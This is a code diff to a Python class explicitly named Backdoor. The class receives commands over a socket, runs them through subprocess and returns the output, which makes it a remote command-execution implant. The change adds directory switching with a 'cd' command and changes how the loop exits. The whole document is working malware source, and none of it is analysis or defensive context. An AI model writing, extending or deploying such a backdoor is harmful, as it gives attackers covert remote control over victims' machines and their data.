@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import os
 
 
 class Backdoor:
@@ -24,13 +25,22 @@ class Backdoor:
         json_obj = json.dumps(result.decode())  # result is in byte format so string
         self.s.send(json_obj.encode())
 
+    def change_driectory(self, path):
+        os.chdir(path)
+        return "The present working directory is changed to " + path
+
     def run(self):
+        result = ""
         while True:
             commands = self.recv_reliably()
             if commands[0] == "exit":
                 self.s.close()
-                break
-            result = self.execute(commands)
+                exit()
+            elif commands[0] == "cd" and len(commands) > 1:
+                result = self.change_driectory(commands[1])
+                result = result.encode()
+            else:
+                result = self.execute(commands)
             self.send_reliably(result)  # here result is in byte format as subprocess returns in byte format
 
 
